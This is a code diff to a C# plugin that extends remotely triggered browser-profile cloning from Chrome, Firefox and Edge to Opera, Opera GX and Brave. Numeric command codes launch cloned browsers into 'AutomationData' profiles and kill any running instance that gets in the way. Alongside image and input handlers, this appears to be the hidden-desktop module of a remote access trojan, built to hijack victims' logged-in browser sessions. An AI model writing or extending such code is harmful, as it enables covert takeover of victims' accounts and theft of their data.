@@ -25,9 +25,15 @@ namespace Plugin
         bool cloning_chrome = false;
         bool cloning_firefox = false;
         bool cloning_edge = false;
+        bool cloning_opera = false;
+        bool cloning_operagx = false;
+        bool cloning_brave = false;
         bool has_clonned_chrome = false;
         bool has_clonned_firefox=false;
         bool has_clonned_edge = false;
+        bool has_clonned_opera = false;
+        bool has_clonned_operagx = false;
+        bool has_clonned_brave = false;
         Imaging_handler ImageHandler;
         input_handler InputHandler;
         Process_Handler ProcessHandler;
@@ -136,6 +142,45 @@ namespace Plugin
                             ProcessHandler.StartEdge();
                         }
                     }
+                    else if (data[0] == 11)
+                    { //start edge
+                        if (do_browser_clone && !has_clonned_opera)
+                        {
+                            has_clonned_opera = true;
+                            HandleCloneOpera();
+
+                        }
+                        else
+                        {
+                            ProcessHandler.StartOpera();
+                        }
+                    }
+                    else if (data[0] == 12)
+                    { //start edge
+                        if (do_browser_clone && !has_clonned_operagx)
+                        {
+                            has_clonned_operagx = true;
+                            HandleCloneOperaGX();
+
+                        }
+                        else
+                        {
+                            ProcessHandler.StartOperaGX();
+                        }
+                    }
+                    else if (data[0] == 13)
+                    { //start edge
+                        if (do_browser_clone && !has_clonned_brave)
+                        {
+                            has_clonned_brave = true;
+                            HandleCloneBrave();
+
+                        }
+                        else
+                        {
+                            ProcessHandler.StartBrave();
+                        }
+                    }
                 }
             }
             catch
@@ -192,6 +237,78 @@ namespace Plugin
                 }
                 ProcessHandler.StartChrome();
                 cloning_chrome = false;
+            }
+        }
+        private async Task HandleCloneOpera()
+        {
+            if (!cloning_opera)
+            {
+                cloning_opera = true;
+                if (!await ProcessHandler.CloneOpera())
+                {
+                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaAutomationData");
+                    if (pid != -1)
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneOpera();
+                        }
+                        catch { }
+                        p.Dispose();
+                    }
+                }
+                ProcessHandler.StartOpera();
+                cloning_opera = false;
+            }
+        }
+        private async Task HandleCloneOperaGX()
+        {
+            if (!cloning_operagx)
+            {
+                cloning_operagx = true;
+                if (!await ProcessHandler.CloneOperaGX())
+                {
+                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaGXAutomationData");
+                    if (pid != -1)
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneOperaGX();
+                        }
+                        catch { }
+                        p.Dispose();
+                    }
+                }
+                ProcessHandler.StartOperaGX();
+                cloning_operagx = false;
+            }
+        }
+        private async Task HandleCloneBrave()
+        {
+            if (!cloning_brave)
+            {
+                cloning_brave = true;
+                if (!await ProcessHandler.CloneBrave())
+                {
+                    int pid = await GetProcessViaCommandLine("brave.exe", "BraveAutomationData");
+                    if (pid != -1)
+                    {
+                        Process p = Process.GetProcessById(pid);
+                        try
+                        {
+                            p.Kill();
+                            await ProcessHandler.CloneBrave();
+                        }
+                        catch { }
+                        p.Dispose();
+                    }
+                }
+                ProcessHandler.StartBrave();
+                cloning_brave = false;
             }
         }
         private async Task HandleCloneFirefox()
